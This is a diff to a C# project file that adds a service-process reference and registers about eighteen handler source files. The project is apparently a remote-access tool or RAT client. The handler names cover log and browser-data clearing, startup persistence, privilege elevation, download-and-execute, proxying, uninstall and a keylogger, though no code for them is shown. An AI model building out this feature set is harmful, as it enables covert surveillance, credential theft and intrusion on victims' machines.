@@ -103,6 +103,7 @@
       <RequiredTargetFramework>3.5</RequiredTargetFramework>
     </Reference>
     <Reference Include="System.Drawing" />
+    <Reference Include="System.ServiceProcess" />
     <Reference Include="System.Windows.Forms" />
   </ItemGroup>
   <ItemGroup>
@@ -140,6 +141,24 @@
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Handlers\RequestViewRegistryKeyHandler.cs" />
+    <Compile Include="Handlers\RequestClearLogHandler.cs" />
+    <Compile Include="Handlers\RequestClearBrowserDataHandler.cs" />
+    <Compile Include="Handlers\RequestRunFileHandler.cs" />
+    <Compile Include="Handlers\RequestCompressFileHandler.cs" />
+    <Compile Include="Handlers\RequestDecompressFileHandler.cs" />
+    <Compile Include="Handlers\RequestWriteStartupHandler.cs" />
+    <Compile Include="Handlers\RequestRestartExplorerHandler.cs" />
+    <Compile Include="Handlers\RequestElevatePrivilegeHandler.cs" />
+    <Compile Include="Handlers\RequestToggleProxyHandler.cs" />
+    <Compile Include="Handlers\RequestProxyMappingHandler.cs" />
+    <Compile Include="Handlers\RequestServiceManagerHandler.cs" />
+    <Compile Include="Handlers\RequestDownloadExecHandler.cs" />
+    <Compile Include="Handlers\RequestChangeConfigHandler.cs" />
+    <Compile Include="Handlers\RequestChangeResolutionHandler.cs" />
+    <Compile Include="Handlers\RequestFindWindowHandler.cs" />
+    <Compile Include="Handlers\RequestRemoteChatHandler.cs" />
+    <Compile Include="Handlers\RequestUninstallHandler.cs" />
+    <Compile Include="Handlers\RequestKeyloggerHandler.cs" />
     <Compile Include="Utils\ScreenUtil.cs" />
   </ItemGroup>
   <ItemGroup>
